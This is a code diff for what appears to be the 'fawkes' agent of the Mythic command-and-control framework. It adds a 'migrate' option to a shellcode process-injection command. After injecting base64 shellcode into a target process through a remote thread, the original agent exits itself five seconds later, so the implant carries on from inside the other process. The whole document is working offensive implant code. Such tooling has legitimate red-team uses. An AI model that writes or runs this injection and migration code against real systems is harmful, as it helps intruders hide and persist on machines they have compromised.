@@ -18,8 +18,12 @@ import (
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
+	"log"
+	"os"
 	"runtime"
+	"strings"
 	"syscall"
+	"time"
 
 	"fawkes/pkg/structs"
 )
@@ -63,6 +67,12 @@ func (c *VanillaInjectionCommand) Description() string {
 type VanillaInjectionParams struct {
 	ShellcodeB64 string `json:"shellcode_b64"` // Base64-encoded shellcode bytes
 	PID          int    `json:"pid"`           // Target process ID
+	Action       string `json:"action"`        // "inject" (default) or "migrate"
+}
+
+// isMigrateAction returns true if the action is a process migration.
+func isMigrateAction(action string) bool {
+	return strings.EqualFold(action, "migrate")
 }
 
 // Execute executes the vanilla-injection command
@@ -130,6 +140,19 @@ func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResu
 
 	output += fmt.Sprintf("[+] Remote thread created (handle: 0x%X)\n", hThread)
 	output += "[+] Vanilla injection completed successfully\n"
+
+	// If this is a migrate action, exit the current agent after injection
+	if isMigrateAction(params.Action) {
+		output += "[*] Migration mode: injected payload into target process\n"
+		output += "[*] Scheduling agent exit in 5 seconds to allow response delivery...\n"
+		go func() {
+			// Give enough time for the response to be sent back to Mythic
+			// and for the new agent instance to start checking in
+			time.Sleep(5 * time.Second)
+			log.Printf("process migration complete — exiting original agent")
+			os.Exit(0)
+		}()
+	}
 
 	return successResult(output)
 }
